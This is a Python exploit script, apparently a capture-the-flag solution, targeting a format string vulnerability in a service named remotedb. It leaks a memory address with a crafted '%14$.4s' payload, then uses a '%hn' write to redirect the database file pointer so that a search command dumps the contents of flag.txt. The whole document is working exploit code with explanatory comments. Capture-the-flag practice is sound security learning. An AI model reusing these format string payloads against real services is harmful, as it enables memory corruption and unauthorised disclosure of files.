'''
There is a string format vulnerability at line 125 in remotedb.c.
The startegy is to exploit this vulnerability in order to overwrite
the dbfile string pointer with the address of licensefile.
Once done that, a call to search() will reveal the content of flag.txt
'''

from struct import pack
import sys
import socket
p = lambda x : pack('I', x)
PORT = 10000
licencefilename_addr = p(0x0804e0f0) #found with nm remotedb | grep file 
dbfilename_addr = 0x0804e0ec
HEADER = "Available commands:\n STS                  check the license\n FND word1 word2 ...  print the db lines that contain any of the words\n                      (one search for connection).\n"

'''
before the actual attack we need to discover the address contained at
location dbfile_addr(namely the staritng address of the string
"/var/log/" SRVNAME ".log").
Giving the server the string
	"AAAA%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx"
as an input(using netcut) we obtain 
		1	2 	    3     4			5		6		7		8    9    10     11  12    13      14		15
																						   ╔════════╗
AAAA--->1-804b02b-26c9-804e000-ffa92648-804afd9-804c467-ffa9223c-3-804ae66-  0 -  0  - 44 -║41414141║-3e2d2d2d
																						   ╚════════╝  
																						     
from the latter we can infer that the 14th argument coincides with the beginning of the string given as input.
A leak is possibile by giving dbfile_addr as an input to remotedb and interpreting it as a  string pointer in the format string.
'''

s = socket.create_connection(("localhost", PORT))
s.recv(len(HEADER))
leakage_payload = licencefilename_addr + b":%14$.4s:" 
s.send(leakage_payload + b"\x0A"*(1024 - len(leakage_payload)))
leaked_licence_name_address = s.recv(len("unknown: ") + 9)[-4:] #this value must go into dbfile variable
s.close()
leaked_addres_full = int.from_bytes(leaked_licence_name_address, "little")
print("the leaked address is " + str(leaked_licence_name_address))


# the actual attack
leaked_addres_ms_bit  = (leaked_addres_full & 0xFFFF0000)>>16
leaked_addres_ls_bit  = (leaked_addres_full & 0x0000FFFF)

print("leaked_addres_ms_bit:" + str(leaked_addres_ms_bit) + ", leaked_addres_ls_bit:" + str(leaked_addres_ls_bit))

payload  = b"%0" + str(leaked_addres_ls_bit).encode("utf-8") + b"c" # arguments no 14-15
payload += b"%18$hnBB"												# arguments no 16-17
payload += p(dbfilename_addr)										# argument no 18


s = socket.create_connection(("localhost", PORT))
s.recv(len(HEADER))
print("sending actual payload, payload length:" + str(len(payload)))
s.send(payload + b"\x0A") 
s.send(b"FND a" + b"\x0A")
print("retrieving dummy bytes", end="") # the format string given as input will print out at least leaked_addres_ls_bit characters
										# before printing the flag. In the Next cycle we will skip them.
while True:
	print(".", end="")
	flag = s.recv(1024)
	if b"Team" in flag:
		print()
		print(flag.decode("utf-8"), end="")
		s.close()
		exit()
